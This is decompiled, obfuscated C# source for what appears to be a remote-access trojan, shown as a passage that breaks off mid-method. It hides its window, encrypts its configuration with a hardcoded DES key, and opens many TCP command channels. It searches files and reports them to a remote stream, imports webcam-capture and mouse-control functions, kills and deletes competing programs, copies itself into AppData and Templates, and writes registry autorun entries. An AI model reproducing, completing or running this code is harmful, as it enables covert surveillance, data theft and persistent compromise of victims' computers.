using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Printing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using Zq5Ees7xyn4O3;
using deenbYSft1fF0;
using vtPJXjyuh5oG2;
using wbAJBEXgqNRI4;

[DesignerGenerated]
public class dly0cASf43 : Form
{
	private IContainer UoKjR9JtZuE10O10;

	[AccessedThroughProperty("ServiceController1")]
	private ServiceController EqPhpotXEmSftq11;

	private bool ZVD1k4AHEbwDuQ12;

	private bool QEQaQ8eKmX7c2X13;

	private bool JoqCFjt3QDGVdW14;

	private int LELMUC70wIplcf15;

	private int yGU71DYgKUXanM16;

	private int OctUUhYIcliqPI17;

	private int RIdk7eu9IzU18;

	private string AYuUQOJfkcj19;

	private string eurVgQtyOBO20;

	private string fp1HC39iEuU21;

	private string string_0;

	private string yuIScXDGaKi23;

	private string LI5T9bF52xP24;

	private string ku7CN272fqj25;

	private int JRxZKRcEXj926;

	private int HyAoUdkU5sY27;

	private TcpClient IaeLz9Bz7vS28;

	private NetworkStream sZel9rNTnAv29;

	private StreamWriter aMz1o7THlkR30;

	private StreamReader K8nKYh23ocE31;

	private Process P5B9z3T6b4o32;

	private StringBuilder cZrcyKtFqax33;

	private int Ae5YptvRkbj34;

	private int wXtqfyQOe8N35;

	private long mVnjMJhzJLthvm3AEp36;

	private short AkKdTtuI7vVOBVpNSa37;

	private byte[] B5GMzKsx2FX3bYcoEN38;

	private FileStream fileStream_0;

	private FileStream IOLZKlqOL4kXCdhBJJ40;

	private BinaryWriter binaryWriter_0;

	private BinaryReader binaryReader_0;

	private int h5DXTcXW0wv2YYxrzG43;

	private long lrdglDlpgrdxgNwGmA44;

	private long c4abIxZL2pIjoOHiqk45;

	private string string_1;

	private MessageBoxIcon w9IGgzBWGX2oQYnbAl47;

	private MessageBoxButtons QdtGecOxwkTqGqAcMg48;

	private string BpJ9oENZtjBgjkHh7149;

	private string string_2;

	private string BGPOS51;

	private Point fIuVf52;

	private Rectangle rectangle_0;

	private const int SC_SCREENSAVE = 61760;

	private const int HWND_BROADCAST = 65535;

	private const int WM_SYSCOMMAND = 274;

	public const long M = 1L;

	public const long MONITOR_ON = -1L;

	public const int MONITOR_OFF = 2;

	private const int SC_MONITORPOWER = 61808;

	private const short WM_CAP = 1024;

	private const int WM_CAP_COPY = 1054;

	private const int WM_CAP_DRIVER_CONNECT = 1034;

	private const int WM_CAP_DRIVER_DISCONNECT = 1035;

	private const int WM_CAP_EDIT_COPY = 1054;

	private const int WM_CAP_GET_FRAME = 1084;

	private int ycWl554;

	private IDataObject x067B55;

	private Image yIRvY56;

	private ManagementObjectSearcher managementObjectSearcher_0;

	private string qccXF58;

	private string OnONf59;

	private string uwRig60;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	private string[] rfMuD61;

	private string[] BAHck62;

	private string[] wQZXa63;

	private Thread POcJT64;

	private string mZYGg65;

	private string[] string_3;

	private int[] int_0;

	private const long MB_DEFBUTTON1 = 0L;

	private const long MB_DEFBUTTON2 = 256L;

	private TcpClient tcpClient_0;

	private NetworkStream networkStream_0;

	private StreamWriter ETktHEpgZ7Zsm1rVyVI3Bn70;

	private StreamReader FAV6plO6xUZud703B7Vpsi71;

	private Thread IhOiDCK6HBXgdKyAf3rTA572;

	private TcpClient sROjUukB8bUmSEi6Iclqdo73;

	private NetworkStream wWTgv0SRYzICOWukIfM6tM74;

	private StreamWriter mQSTi8lfx9R4lRqEZjJhdk75;

	private StreamReader EfPlBou5E7VJA3nBHJvI2y76;

	private Thread KKADU3gsncz1bC4WxXLruK77;

	private TcpClient tcpClient_1;

	private NetworkStream azRLxKcxWA30BZnxNTQnq479;

	private StreamWriter J580cztlCh0prHvvQRNdyH80;

	private StreamReader streamReader_0;

	private Thread thread_0;

	private TcpClient tcpClient_2;

	private NetworkStream WIgtgeUVk84;

	private StreamWriter SnN5zNIYZ85;

	private StreamReader streamReader_1;

	private Thread PhqKGp3zj87;

	private TcpClient Lbgc3BoOx88;

	private NetworkStream P1M31Ujav89;

	private StreamWriter C4rq6b25E90;

	private StreamReader U8Ho2ZuWN91;

	private Thread IWBVutix392;

	private TcpClient oLfvrvTqv93;

	private NetworkStream Sl559XWuG94;

	private StreamWriter PrZNz47Ad95;

	private StreamReader THAY7y8Dk96;

	private Thread poGcuBuBB97;

	private TcpClient IDNEYZMt698;

	private NetworkStream networkStream_1;

	private StreamWriter VUdwXv100;

	private StreamReader Dx5ZDW101;

	private Thread ojXtoX102;

	private TcpClient qfIAbE103;

	private NetworkStream s527dZ104;

	private StreamWriter QUuRyH105;

	private StreamReader nbGh1r106;

	private Thread TNP9Ei107;

	private TcpClient fHZTRK108;

	private NetworkStream networkStream_2;

	private StreamWriter tvj69J110;

	private StreamReader rwKf5d111;

	private Thread h9dgGo112;

	private TcpClient OiqJRw113;

	private NetworkStream ZX3KQe114;

	private StreamWriter YN6NOv115;

	private StreamReader streamReader_2;

	private Thread y0CMBHwKDkLLr117;

	private TcpClient JEN6bGHGwgh6t118;

	private NetworkStream lI9TKHBibRTdl119;

	private StreamWriter ld5AE2ll4RjHs120;

	private StreamReader qZr2JkF8mOBKA121;

	private Thread thread_1;

	private TcpClient eL7hQPchhBQ98123;

	private NetworkStream zydYotQ3Zacw5124;

	private StreamWriter pOC5vQ675U05Y125;

	private StreamReader MxiMyjoEkkCl5126;

	private Thread thread_2;

	private TcpClient tcpClient_3;

	private NetworkStream S7q5uZJpI0yQj129;

	private StreamWriter streamWriter_0;

	private StreamReader qsFqNM2Y2DkkT131;

	private Thread FrGh1sDk7ydk88B8ALNd132;

	private TcpClient NzhKidLNk2HS2gX9M0jb133;

	private NetworkStream eljTs5FErPsRx6659WZO134;

	private StreamWriter GP04RkhRarmzrCZrgohc135;

	private StreamReader y7muAPkW9S0Q1vvole17136;

	private Thread ONuZtTqV7EPLEMfztvt2137;

	private TcpClient ZlIirvxW7A51n9oLCm0H138;

	private NetworkStream ppOv2fcefVUQLY7s4cxY139;

	private StreamWriter ltNxzNounuW7uMDzwdfc140;

	private StreamReader jiGbFfgo2WGqO2mVBhWf141;

	private Thread QHRLZNlZlxVRWlE2NCRj142;

	private TcpClient xZsrOvirpHYfhZlCrVbS143;

	private NetworkStream Tg2u0Outoj8ZqCIQepXu144;

	private StreamWriter uUzDzGAWZ2ARrYqgXYqZ145;

	private StreamReader streamReader_3;

	private Thread dxumJgyrbsTgZXsGRt4A147;

	private TcpClient RVFuEzTJArzy37LukGmi148;

	private NetworkStream qmtPA620eH7dkjshR149;

	private StreamWriter ZHanOQKSlcRbYla7M150;

	private StreamReader ausQTxwTvTjmdKFuC151;

	private Thread lZcUCvJWfUaOgmX6y152;

	private TcpClient tcpClient_4;

	private NetworkStream ZaURxYJUEDl4exmfF154;

	private StreamWriter AIFBgQyqjyip7rX6V155;

	private StreamReader mNbHBY57qvhq4q4gt156;

	private Thread Ru2KJkmqeqruxboXj157;

	private TcpClient ay4XZJzuPkg0e8e8E158;

	private NetworkStream As4aCsOgnxECTkTsL159;

	private StreamWriter fvcvSLsfU05qZicmS160;

	private int BVT8y6fHBcVRVZnxt161;

	private string SIW9IHBVHsJPofrg0162;

	private Mutex JYyCGpWNgyxnZ0ISv163;

	private Thread pupJSdidQDwScXtBU164;

	private string gpZQbj0lr93xHr1WTPXQgQKg165;

	private bool pPLpV3B3M5JjTEdapoq4eG9c166;

	private bool vVj7wLDpEIrlyAqnx0LCHI3e167;

	private bool BMqSpF2JGzUZKux1rjEbcSCP168;

	private int Y3xeVwuMS5vJkK0ZGIEYFqD3169;

	private int sJao3S1JaBUm8NOa587FYNGH170;

	private List<Rectangle> jEuudDaxptLbm6I03MzJQDQS171;

	private int[] UuTxiY5F3t4onxwwrmXE2DOY172;

	private string p7BbeXRGOCzIKDero67S1kCv173;

	private int g3htGcQhGU8bmTq5CnALXNLO174;

	private int int_1;

	private bool F2gDJRyshtl9WULKX3GhYfpe176;

	private string nZZEKWj4rLgtFjmCxsUb2QER177;

	private int wiSrmNwqC1gJSTHkagHbEi5E178;

	internal virtual ServiceController ServiceController1
	{
		get
		{
			return EqPhpotXEmSftq11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EqPhpotXEmSftq11 = value;
		}
	}

	private string Manufacturer => qccXF58;

	private string Model => OnONf59;

	private string WindowsDirectory => uwRig60;

	public dly0cASf43()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Shown((EventHandler)MCXAU1jwqsnCkFw99);
		((Form)this).add_FormClosing(new FormClosingEventHandler(hNW16kpF2PgT111));
		ZVD1k4AHEbwDuQ12 = false;
		LELMUC70wIplcf15 = 0;
		Ae5YptvRkbj34 = 32768;
		wXtqfyQOe8N35 = 65536;
		B5GMzKsx2FX3bYcoEN38 = new byte[0];
		BGPOS51 = Conversions.ToString(Environment.OSVersion.Version.Major);
		rectangle_0 = Screen.get_PrimaryScreen().get_Bounds();
		mZYGg65 = "";
		string_3 = new string[4] { "Default", "90", "180", "270" };
		int_0 = new int[4] { 0, 1, 2, 3 };
		pPLpV3B3M5JjTEdapoq4eG9c166 = false;
		vVj7wLDpEIrlyAqnx0LCHI3e167 = false;
		BMqSpF2JGzUZKux1rjEbcSCP168 = false;
		checked
		{
			Y3xeVwuMS5vJkK0ZGIEYFqD3169 = (int)Math.Round((double)rectangle_0.Width / 4.0);
			sJao3S1JaBUm8NOa587FYNGH170 = (int)Math.Round((double)rectangle_0.Height / 4.0);
			jEuudDaxptLbm6I03MzJQDQS171 = new List<Rectangle>();
			UuTxiY5F3t4onxwwrmXE2DOY172 = new int[17];
			p7BbeXRGOCzIKDero67S1kCv173 = null;
			g3htGcQhGU8bmTq5CnALXNLO174 = 0;
			F2gDJRyshtl9WULKX3GhYfpe176 = false;
			xoB31Poa86();
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new dly0cASf43());
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			if (disposing && UoKjR9JtZuE10O10 != null)
			{
				UoKjR9JtZuE10O10.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void xoB31Poa86()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		new ComponentResourceManager(typeof(dly0cASf43));
		ServiceController1 = new ServiceController();
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		Padding margin = default(Padding);
		((Padding)(ref margin))._002Ector(18, 39, 18, 39);
		((Form)this).set_Margin(margin);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainFrm");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, int dwStyle, int x, int y, int nWidth, short nHeight, int hWndParent, int nID);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciExecute([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr hwnd, IntPtr hWndChild, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindow);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool IsWindowVisible(IntPtr hwnd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SwapMouseButton(long bSwap);

	private void MCXAU1jwqsnCkFw99(object sender, EventArgs e)
	{
		try
		{
			method_6(5);
			JYyCGpWNgyxnZ0ISv163 = new Mutex(initiallyOwned: false, vhAVNcEbjr2qnw5oW16.sS4vZJHfPCjuIM00H40());
			if (!JYyCGpWNgyxnZ0ISv163.WaitOne(0, exitContext: false))
			{
				JYyCGpWNgyxnZ0ISv163.Close();
				JYyCGpWNgyxnZ0ISv163 = null;
				ProjectData.EndApp();
			}
			((Control)this).set_Visible(false);
			yuIScXDGaKi23 = NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.udkhF5E1g3gY4FzuU36(), "12345#$%");
			SIW9IHBVHsJPofrg0162 = yuIScXDGaKi23;
			LI5T9bF52xP24 = NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.cGqoQbWUw8odfMsVs38(), "12345#$%");
			JRxZKRcEXj926 = vhAVNcEbjr2qnw5oW16.PUE9mLHIYytWanEJM37();
			BVT8y6fHBcVRVZnxt161 = JRxZKRcEXj926;
			HyAoUdkU5sY27 = vhAVNcEbjr2qnw5oW16.GaJM8sCzHwa45GBeh39();
			method_6(1);
			if ((Operators.CompareString(SIW9IHBVHsJPofrg0162, (string)null, false) == 0) | (BVT8y6fHBcVRVZnxt161 == 0))
			{
				Environment.Exit(0);
			}
			else
			{
				try
				{
					method_1();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					Thread thread = new Thread(IkbZpoBmjnpVH6r107);
					thread.Start();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				POcJT64 = new Thread(kP8ubQWSacfwBw211);
				POcJT64.Start();
				try
				{
					Thread thread2 = new Thread(method_0);
					thread2.Start();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			RIdk7eu9IzU18 = ((Control)this).get_Handle().ToInt32();
			ZRaK1w8aTGW9UmZq151();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("dnsapi.dll")]
	private static extern uint DnsFlushResolverCache();

	private void method_0()
	{
		while (true)
		{
			method_6(1800);
			try
			{
				if (!IaeLz9Bz7vS28.Connected)
				{
					DnsFlushResolverCache();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	private string uh57vDeLLFGedW6104()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void HISKxC5ln144qaj105(object currentDirectory)
	{
		checked
		{
			try
			{
				if (!QEQaQ8eKmX7c2X13)
				{
					return;
				}
				rfMuD61 = Directory.GetDirectories(Conversions.ToString(currentDirectory));
				BAHck62 = Directory.GetFiles(Conversions.ToString(currentDirectory));
				string[] bAHck = BAHck62;
				foreach (string text in bAHck)
				{
					if (wQZXa63[1].StartsWith("*"))
					{
						string[] array = wQZXa63[1].Split(new char[1] { '.' });
						if (text.EndsWith(array[array.Length - 1]))
						{
							ld5AE2ll4RjHs120.WriteLine("/SEARCHFL/" + text + "¦" + Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().GetFileInfo(text).Length));
							ld5AE2ll4RjHs120.Flush();
						}
					}
					else
					{
						string[] array2 = text.Split(new char[1] { '\\' });
						if (array2[array2.Length - 1].Contains(wQZXa63[1]))
						{
							ld5AE2ll4RjHs120.WriteLine("/SEARCHFL/" + text + "¦" + Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().GetFileInfo(text).Length));
							ld5AE2ll4RjHs120.Flush();
						}
					}
				}
				string[] array3 = rfMuD61;
				foreach (string text2 in array3)
				{
					if (!(text2.Substring(3).StartsWith("WINDOWS") | text2.Substring(3).StartsWith("WINNT")))
					{
						HISKxC5ln144qaj105(text2);
					}
				}
				rfMuD61 = null;
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(currentDirectory, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)3, false))
				{
					ld5AE2ll4RjHs120.WriteLine("/SEARCHFL/SEARCHEND");
					ld5AE2ll4RjHs120.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private ImageCodecInfo BckQMcCJXq3vz1L106(string mimeType)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = imageEncoders.Length;
		int num2 = 0;
		while (true)
		{
			if (num2 <= num)
			{
				if (Operators.CompareString(imageEncoders[num2].get_MimeType(), mimeType, false) == 0)
				{
					break;
				}
				num2 = checked(num2 + 1);
				continue;
			}
			return null;
		}
		return imageEncoders[num2];
	}

	private void IkbZpoBmjnpVH6r107()
	{
		try
		{
			method_6(5);
			method_2();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private object zNBr3tUnaT5ZVku108(string ProcessName)
	{
		Process process = new Process();
		Process[] processesByName = Process.GetProcessesByName(ProcessName);
		IEnumerator enumerator = default(IEnumerator);
		for (int i = 0; i < processesByName.Length; i = checked(i + 1))
		{
			process = processesByName[i];
			try
			{
				try
				{
					enumerator = process.Modules.GetEnumerator();
					if (!enumerator.MoveNext())
					{
						continue;
					}
					ProcessModule processModule = (ProcessModule)enumerator.Current;
					return processModule.FileName!.ToString();
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return null;
	}

	private void method_1()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(zNBr3tUnaT5ZVku108(process.ProcessName))).Length <= 100000L)
					{
						continue;
					}
					double num = double.Parse(FileVersionInfo.GetVersionInfo(Conversions.ToString(zNBr3tUnaT5ZVku108(process.ProcessName))).ProductVersion);
					if (num == 3.0 || num == 3.1 || num == 3.2 || num == 3.3 || num == 3.4 || num == 3.5)
					{
						try
						{
							process.Kill();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						method_6(2);
						try
						{
							((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().DeleteFile(Conversions.ToString(zNBr3tUnaT5ZVku108(process.ProcessName)));
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					else if (num == 3.7)
					{
						Environment.Exit(0);
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void method_2()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())))
			{
				try
				{
					byte[] array = ((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
					try
					{
						((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath()), array, false);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						method_6(1);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath()), array, false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			method_6(2);
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())) && Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.GuZZ3eNP8EMPqrNYY41(), "12345#$%"), writable: false)!.GetValue(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.jzQXHq2xjPj4YK94n42(), "12345#$%")), (object)(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())), false))))
				{
					((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.GuZZ3eNP8EMPqrNYY41(), "12345#$%"), writable: true)!.SetValue(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.jzQXHq2xjPj4YK94n42(), "12345#$%"), Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			method_6(1);
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath())) && Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.GuZZ3eNP8EMPqrNYY41(), "12345#$%"), writable: false)!.GetValue(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.smethod_0(), "12345#$%")), (object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath())), false))))
				{
					((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.GuZZ3eNP8EMPqrNYY41(), "12345#$%"), writable: true)!.SetValue(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.smethod_0(), "12345#$%"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void hNW16kpF2PgT111(object sender, FormClosingEventArgs e)
	{
		try
		{
			method_2();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string A4MHFmQw3DUU112(string strText, string strEncrKey)
	{
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(strEncrKey, 8));
			byte[] bytes2 = Encoding.UTF8.GetBytes(strText);
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(bytes2, 0, bytes2.Length);
			cryptoStream.FlushFinalBlock();
			return Convert.ToBase64String(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string NBampsfdonlv113(string strText, string sDecrKey)
	{
		try
		{
			byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
			byte[] array = new byte[checked(strText.Length + 1)];
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			array = Convert.FromBase64String(strText);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			Encoding uTF = Encoding.UTF8;
			return uTF.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void NSkqwkNbctHQ114()
	{
		try
		{
			fileStream_0.Close();
			binaryReader_0.Close();
			binaryWriter_0 = null;
			IOLZKlqOL4kXCdhBJJ40 = null;
			binaryReader_0 = null;
			fileStream_0 = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool QOcS3AUET2du115(ref string FileName)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 53:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				flag = (FileSystem.GetAttr(FileName) & 0x10) == 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
